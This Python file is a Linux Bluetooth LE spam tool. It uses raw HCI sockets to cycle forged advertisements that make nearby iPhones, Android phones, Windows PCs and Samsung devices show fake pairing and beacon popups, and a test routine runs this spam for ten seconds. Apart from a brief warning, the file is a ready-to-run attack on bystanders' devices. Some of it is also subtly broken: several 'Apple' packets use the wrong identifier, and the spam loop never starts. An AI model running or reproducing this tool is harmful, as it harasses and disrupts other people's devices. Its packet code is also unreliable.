"""
Linux Bluetooth Transmitter - Real BLE Packet Transmission
Uses BlueZ and raw HCI sockets for actual Bluetooth spam
WARNING: For authorized security testing only!
"""

import asyncio
import socket
import struct
import fcntl
import logging
import subprocess
from typing import Optional, Dict, Any, List
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class HCICommands:
    """HCI command constants"""
    OGF_LE_CONTROLLER = 0x08
    
    # LE commands
    OCF_LE_SET_ADVERTISING_PARAMETERS = 0x0006
    OCF_LE_SET_ADVERTISING_DATA = 0x0008
    OCF_LE_SET_SCAN_RESPONSE_DATA = 0x0009
    OCF_LE_SET_ADVERTISE_ENABLE = 0x000A
    OCF_LE_SET_SCAN_PARAMETERS = 0x000B
    OCF_LE_SET_SCAN_ENABLE = 0x000C


@dataclass
class AdvertisementConfig:
    """BLE advertisement configuration"""
    min_interval: int = 0x0020  # 20ms
    max_interval: int = 0x0040  # 40ms
    adv_type: int = 0x00  # ADV_IND
    own_addr_type: int = 0x00  # Public
    peer_addr_type: int = 0x00
    peer_addr: bytes = b'\x00' * 6
    channel_map: int = 0x07  # All 3 channels
    filter_policy: int = 0x00


class LinuxBluetoothTransmitter:
    """
    Real Bluetooth LE packet transmitter for Linux
    Requires root access and BlueZ
    """
    
    def __init__(self, device: str = "hci0"):
        self.device = device
        self.hci_socket: Optional[socket.socket] = None
        self.device_id: int = 0
        self.is_transmitting = False
        
        # Statistics
        self.stats = {
            'packets_sent': 0,
            'transmission_errors': 0
        }
    
    async def initialize(self) -> bool:
        """Initialize HCI socket"""
        try:
            # Get device ID
            self.device_id = await self._get_device_id()
            if self.device_id < 0:
                logger.error(f"Device {self.device} not found")
                return False
            
            # Create raw HCI socket
            self.hci_socket = socket.socket(
                socket.AF_BLUETOOTH,
                socket.SOCK_RAW,
                socket.BTPROTO_HCI
            )
            
            # Bind to device
            self.hci_socket.bind((self.device_id,))
            
            # Set non-blocking
            self.hci_socket.setblocking(False)
            
            logger.info(f"Initialized HCI socket on {self.device}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to initialize: {e}")
            return False
    
    async def _get_device_id(self) -> int:
        """Get HCI device ID from name"""
        try:
            result = subprocess.run(
                ['hcitool', 'dev'],
                capture_output=True,
                text=True
            )
            
            for line in result.stdout.split('\n'):
                if self.device in line:
                    # Parse "hci0    XX:XX:XX:XX:XX:XX"
                    parts = line.split()
                    if parts:
                        return int(parts[0].replace('hci', ''))
            
            return -1
            
        except Exception as e:
            logger.error(f"Error getting device ID: {e}")
            return -1
    
    async def start_advertising(self, data: bytes, config: Optional[AdvertisementConfig] = None) -> bool:
        """Start BLE advertising with custom data"""
        if not self.hci_socket:
            logger.error("Not initialized")
            return False
        
        config = config or AdvertisementConfig()
        
        try:
            # 1. Disable advertising first
            await self._send_hci_command(
                HCICommands.OGF_LE_CONTROLLER,
                HCICommands.OCF_LE_SET_ADVERTISE_ENABLE,
                b'\x00'
            )
            
            # 2. Set advertising parameters
            params = struct.pack('<HHBB6sBB',
                config.min_interval,
                config.max_interval,
                config.adv_type,
                config.own_addr_type,
                config.peer_addr,
                config.channel_map,
                config.filter_policy
            )
            
            await self._send_hci_command(
                HCICommands.OGF_LE_CONTROLLER,
                HCICommands.OCF_LE_SET_ADVERTISING_PARAMETERS,
                params
            )
            
            # 3. Set advertising data (max 31 bytes)
            adv_data = data[:31]
            adv_len = len(adv_data)
            padding = b'\x00' * (31 - adv_len)
            
            await self._send_hci_command(
                HCICommands.OGF_LE_CONTROLLER,
                HCICommands.OCF_LE_SET_ADVERTISING_DATA,
                bytes([adv_len]) + adv_data + padding
            )
            
            # 4. Enable advertising
            await self._send_hci_command(
                HCICommands.OGF_LE_CONTROLLER,
                HCICommands.OCF_LE_SET_ADVERTISE_ENABLE,
                b'\x01'
            )
            
            self.is_transmitting = True
            logger.info("Started BLE advertising")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start advertising: {e}")
            return False
    
    async def stop_advertising(self) -> bool:
        """Stop BLE advertising"""
        if not self.hci_socket:
            return False
        
        try:
            await self._send_hci_command(
                HCICommands.OGF_LE_CONTROLLER,
                HCICommands.OCF_LE_SET_ADVERTISE_ENABLE,
                b'\x00'
            )
            
            self.is_transmitting = False
            logger.info("Stopped BLE advertising")
            return True
            
        except Exception as e:
            logger.error(f"Failed to stop advertising: {e}")
            return False
    
    async def _send_hci_command(self, ogf: int, ocf: int, data: bytes) -> bool:
        """Send HCI command to controller"""
        if not self.hci_socket:
            return False
        
        # Build HCI command packet
        opcode = (ogf << 10) | ocf
        pkt = struct.pack('<HB', opcode, len(data)) + data
        
        try:
            # Send via socket
            loop = asyncio.get_event_loop()
            await loop.sock_sendall(self.hci_socket, pkt)
            
            # Wait for command complete event (simplified)
            await asyncio.sleep(0.01)
            
            self.stats['packets_sent'] += 1
            return True
            
        except Exception as e:
            self.stats['transmission_errors'] += 1
            logger.error(f"HCI command failed: {e}")
            return False
    
    async def spam_advertisements(self, packets: List[bytes], interval: float = 0.1) -> None:
        """
        Spam multiple advertisement packets in rotation
        This will make nearby phones "go crazy" with notifications
        """
        if not await self.initialize():
            logger.error("Cannot start spam - initialization failed")
            return
        
        logger.info(f"Starting advertisement spam with {len(packets)} packet variants")
        
        try:
            idx = 0
            while self.is_transmitting:
                packet = packets[idx % len(packets)]
                
                # Update advertising data
                await self.start_advertising(packet)
                
                # Wait before changing
                await asyncio.sleep(interval)
                
                idx += 1
                
                # Log progress every 10 packets
                if idx % 10 == 0:
                    logger.info(f"Spam cycle {idx}, sent {self.stats['packets_sent']} packets")
                    
        except asyncio.CancelledError:
            logger.info("Spam cancelled")
        finally:
            await self.stop_advertising()
    
    def close(self):
        """Close HCI socket"""
        if self.hci_socket:
            try:
                self.hci_socket.close()
            except:
                pass
            self.hci_socket = None
        self.is_transmitting = False


class BLESpamAttack:
    """
    Pre-configured BLE spam attacks that affect phones
    """
    
    @staticmethod
    def generate_airpods_popup() -> bytes:
        """
        Generate AirPods connection popup spam
        Makes iPhones show "AirPods" connection dialog
        """
        # Apple AirPods advertisement
        return bytes([
            0x02, 0x01, 0x06,  # Flags: LE General Discoverable
            0x03, 0x03, 0xAA, 0xFE,  # Apple service UUID
            0x11, 0x16, 0xAA, 0xFE,  # Service data
            0x00, 0x00,  # Apple device type (AirPods)
            0x00, 0x00, 0x00, 0x00,  # Device ID
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
        ])
    
    @staticmethod
    def generate_beats_popup() -> bytes:
        """Generate Beats connection popup spam"""
        return bytes([
            0x02, 0x01, 0x06,
            0x03, 0x03, 0xAA, 0xFE,
            0x11, 0x16, 0xAA, 0xFE,
            0x05, 0x00,  # Beats device type
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
        ])
    
    @staticmethod
    def generate_ibeacon_spam(uuid: bytes = None) -> bytes:
        """
        Generate iBeacon spam
        Triggers location-based notifications on iOS
        """
        if uuid is None:
            uuid = b'\x00' * 16
        
        return bytes([
            0x02, 0x01, 0x06,
            0x1A, 0xFF,  # Manufacturer data (26 bytes)
            0x4C, 0x00,  # Apple company ID
            0x02, 0x15,  # iBeacon indicator
        ]) + uuid + bytes([
            0x00, 0x01,  # Major
            0x00, 0x01,  # Minor
            0xC5,  # TX power
        ])
    
    @staticmethod
    def generate_fastpair_spam() -> bytes:
        """
        Generate Android Fast Pair spam
        Makes Android phones show pairing notifications
        """
        return bytes([
            0x02, 0x01, 0x06,
            0x03, 0x03, 0x2C, 0xFE,  # Google Fast Pair UUID
            0x06, 0x16, 0x2C, 0xFE,  # Service data
            0x00, 0x00, 0x00, 0x00,  # Model ID
        ])
    
    @staticmethod
    def generate_swiftpair_spam() -> bytes:
        """
        Generate Windows Swift Pair spam
        Makes Windows PCs show pairing notifications
        """
        return bytes([
            0x02, 0x01, 0x06,
            0x03, 0x03, 0x98, 0xFE,  # Microsoft Swift Pair UUID
            0x04, 0x16, 0x98, 0xFE,  # Service data
            0x00, 0x00,  # Device type
        ])
    
    @staticmethod
    def generate_samsung_buds_spam() -> bytes:
        """Generate Samsung Galaxy Buds spam"""
        return bytes([
            0x02, 0x01, 0x06,
            0x03, 0x03, 0xFE, 0x75,  # Samsung UUID
            0x0A, 0x16, 0xFE, 0x75,  # Service data
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ])
    
    @staticmethod
    def get_all_attack_packets() -> List[bytes]:
        """Get all spam packet variants for maximum chaos"""
        return [
            BLESpamAttack.generate_airpods_popup(),
            BLESpamAttack.generate_beats_popup(),
            BLESpamAttack.generate_ibeacon_spam(),
            BLESpamAttack.generate_fastpair_spam(),
            BLESpamAttack.generate_swiftpair_spam(),
            BLESpamAttack.generate_samsung_buds_spam(),
        ]


async def test_linux_transmitter():
    """Test Linux Bluetooth transmitter"""
    print("\n" + "="*60)
    print("Linux Bluetooth Transmitter Test")
    print("="*60)
    print("WARNING: This will transmit real Bluetooth packets!")
    print("Make sure you have permission and are in a controlled environment.")
    print("="*60)
    
    # Check if running on Linux
    import sys
    if sys.platform != 'linux':
        print(f"\n This only works on Linux, not {sys.platform}")
        print("Boot from a Linux USB stick to use this feature.")
        return False
    
    # Check for root
    import os
    if os.geteuid() != 0:
        print("\n Root access required")
        print("Run with: sudo python linux_bluetooth_tx.py")
        return False
    
    # Initialize transmitter
    tx = LinuxBluetoothTransmitter("hci0")
    
    if not await tx.initialize():
        print("\n Failed to initialize Bluetooth adapter")
        print("Make sure BlueZ is installed: sudo apt install bluez")
        return False
    
    print("\n Bluetooth adapter initialized")
    
    # Test single advertisement
    print("\n1. Testing single advertisement...")
    packet = BLESpamAttack.generate_airpods_popup()
    success = await tx.start_advertising(packet)
    
    if success:
        print("    Advertising started")
        print("    Check nearby iPhones for AirPods popup!")
        await asyncio.sleep(3)
        await tx.stop_advertising()
        print("    Advertising stopped")
    else:
        print("    Failed to start advertising")
    
    # Test spam attack
    print("\n2. Testing spam attack (10 seconds)...")
    print("    All nearby phones should go crazy!")
    
    packets = BLESpamAttack.get_all_attack_packets()
    spam_task = asyncio.create_task(
        tx.spam_advertisements(packets, interval=0.5)
    )
    
    await asyncio.sleep(10)
    spam_task.cancel()
    
    try:
        await spam_task
    except asyncio.CancelledError:
        pass
    
    tx.close()
    
    print(f"\n Test complete!")
    print(f"   Packets sent: {tx.stats['packets_sent']}")
    print(f"   Errors: {tx.stats['transmission_errors']}")
    
    return True


if __name__ == "__main__":
    # Run test
    try:
        result = asyncio.run(test_linux_transmitter())
        if result:
            print("\n Linux Bluetooth spam is working!")
        else:
            print("\n  Could not run test (see errors above)")
    except KeyboardInterrupt:
        print("\n\nStopped by user")
    except Exception as e:
        print(f"\n Error: {e}")
        import traceback
        traceback.print_exc()
